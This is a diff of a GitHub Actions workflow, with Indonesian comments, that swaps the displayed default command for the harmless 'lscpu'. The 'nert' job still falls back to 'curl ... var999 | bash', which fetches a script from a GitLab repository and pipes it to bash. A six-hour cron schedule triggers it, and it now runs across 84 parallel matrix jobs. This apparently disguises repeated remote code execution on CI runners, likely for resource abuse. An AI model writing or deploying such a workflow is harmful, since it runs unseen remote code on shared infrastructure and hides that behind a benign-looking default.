@@ -1,12 +1,12 @@
-name: auto space
+name: iokoi
 
 on:
   workflow_dispatch:
     inputs:
       command:
-        description: 'Perintah yang akan dijalankan di job hert'
+        description: 'Perintah untuk job nert & dert'
         required: false
-        default: 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash'
+        default: 'lscpu'
   schedule:
     - cron: '0 */6 * * *'   # setiap 6 jam
 
@@ -23,24 +23,24 @@ jobs:
         continue-on-error: true
         run: echo hert
 
-nert:
-  needs: [hert]
-  runs-on: ubuntu-latest
-  timeout-minutes: 5          
-  strategy:
-    fail-fast: false
-    matrix:
-      build: [C.1, D.1]
-      flag: [A, B, C, D, E, F, G, H, I, J]
-  steps:
-    - name: Jalankan perintah
-      continue-on-error: true
-      run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}
-
+  nert:
+    needs: [hert]
+    runs-on: ubuntu-latest
+    timeout-minutes: 5          # ⏰ Job akan berhenti total setelah 5 menit
+    strategy:
+      fail-fast: false
+      matrix:
+        build: [C.1, D.1, D.2, D.3, D.4, D.5]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N]
+    steps:
+      - name: Jalankan perintah (default lscpu)
+        continue-on-error: true
+        run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}
 
   dert:
     needs: [hert]
     runs-on: ubuntu-latest
+    timeout-minutes: 5
     strategy:
       fail-fast: false
       matrix:
